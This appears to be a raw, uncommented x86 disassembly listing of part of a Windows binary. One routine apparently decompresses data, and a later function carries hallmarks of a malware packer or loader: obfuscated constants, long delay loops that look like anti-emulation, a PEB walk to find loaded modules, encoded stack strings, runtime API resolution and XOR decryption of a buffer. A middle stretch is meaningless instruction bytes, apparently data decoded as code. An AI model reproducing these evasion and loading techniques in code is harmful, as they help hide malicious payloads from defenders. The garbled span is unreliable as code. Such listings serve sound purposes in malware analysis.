  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
  4202ca:	inc    eax
  4202cb:	jmp    0x4202a5
  4202cd:	cmp    ebx,0x1000000
  4202d3:	jb     0x4202d6
  4202d5:	ret    
  4202d6:	shl    ebx,0x8
  4202d9:	push   esi
  4202da:	mov    esi,DWORD PTR [ebp-0x8]
  4202dd:	cmp    esi,DWORD PTR [ebp+0x1c]
  4202e0:	jae    0x4202c6
  4202e2:	mov    ecx,0xe920ea0
  4202e7:	stos   DWORD PTR es:[edi],eax
  4202e8:	cmp    eax,0xb10ea0b1
  4202ed:	pusha  
  4202ee:	outs   dx,BYTE PTR ds:[esi]
  4202ef:	add    al,0x9a
  4202f1:	mov    ecx,0x65c79ec0
  4202f6:	mov    ss,WORD PTR [edx-0x5f6864ee]
  4202fc:	cs xchg edi,eax
  4202fe:	xchg   edx,eax
  4202ff:	cmp    ah,BYTE PTR [ebx-0x68719a39]
  420305:	mov    al,ds:0xae40b99e
  42030a:	sar    DWORD PTR [eax+eiz*4],0x8b
  42030e:	aaa    
  42030f:	mov    es,ecx
  420311:	cmp    al,0xa0
  420313:	mov    edx,DWORD PTR [ecx-0x74747486]
  420319:	(bad)  
  42031a:	pop    eax
  42031b:	sti    
  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
